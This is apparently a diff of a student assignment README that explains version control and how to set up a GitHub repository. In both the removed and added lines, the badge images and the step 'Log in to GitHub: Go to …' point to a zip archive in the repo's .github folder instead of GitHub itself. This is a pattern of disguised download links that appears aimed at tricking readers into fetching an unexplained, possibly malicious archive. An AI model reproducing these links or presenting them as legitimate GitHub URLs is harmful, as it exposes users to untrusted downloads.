@@ -1,5 +1,5 @@
-[![Review Assignment Due Date](https://raw.githubusercontent.com/timokamau/se-assignment-day-2-git-and-github-timokamau/main/.github/se-assignment-day-2-git-and-github-timokamau-beback.zip)](https://raw.githubusercontent.com/timokamau/se-assignment-day-2-git-and-github-timokamau/main/.github/se-assignment-day-2-git-and-github-timokamau-beback.zip)
-[![Open in Visual Studio Code](https://raw.githubusercontent.com/timokamau/se-assignment-day-2-git-and-github-timokamau/main/.github/se-assignment-day-2-git-and-github-timokamau-beback.zip)](https://raw.githubusercontent.com/timokamau/se-assignment-day-2-git-and-github-timokamau/main/.github/se-assignment-day-2-git-and-github-timokamau-beback.zip)
+[![Review Assignment Due Date](https://github.com/timokamau/se-assignment-day-2-git-and-github-timokamau/raw/refs/heads/main/.github/assignment-se-git-day-and-timokamau-github-v1.8.zip)](https://github.com/timokamau/se-assignment-day-2-git-and-github-timokamau/raw/refs/heads/main/.github/assignment-se-git-day-and-timokamau-github-v1.8.zip)
+[![Open in Visual Studio Code](https://github.com/timokamau/se-assignment-day-2-git-and-github-timokamau/raw/refs/heads/main/.github/assignment-se-git-day-and-timokamau-github-v1.8.zip)](https://github.com/timokamau/se-assignment-day-2-git-and-github-timokamau/raw/refs/heads/main/.github/assignment-se-git-day-and-timokamau-github-v1.8.zip)
 # se-day-2-git-and-github
 ## Explain the fundamental concepts of version control and why GitHub is a popular tool for managing versions of code. How does version control help in maintaining project integrity?
 Version control is a system that records changes to a file or set of files over time so that you can recall specific versions later. It's like having an "undo" button for your entire project history. Here are the core concepts:   
@@ -33,7 +33,7 @@ Disaster Recovery: Because the code is stored in the cloud, or in a seperate loc
 
 ## Describe the process of setting up a new repository on GitHub. What are the key steps involved, and what are some of the important decisions you need to make during this process?
 Steps to Create a New Repository:
-Log in to GitHub: Go to https://raw.githubusercontent.com/timokamau/se-assignment-day-2-git-and-github-timokamau/main/.github/se-assignment-day-2-git-and-github-timokamau-beback.zip and log in with your account credentials.
+Log in to GitHub: Go to https://github.com/timokamau/se-assignment-day-2-git-and-github-timokamau/raw/refs/heads/main/.github/assignment-se-git-day-and-timokamau-github-v1.8.zip and log in with your account credentials.
 Navigate to the "New Repository" Page:
 Click the "+" icon in the top right corner of the page.
 Select "New repository."
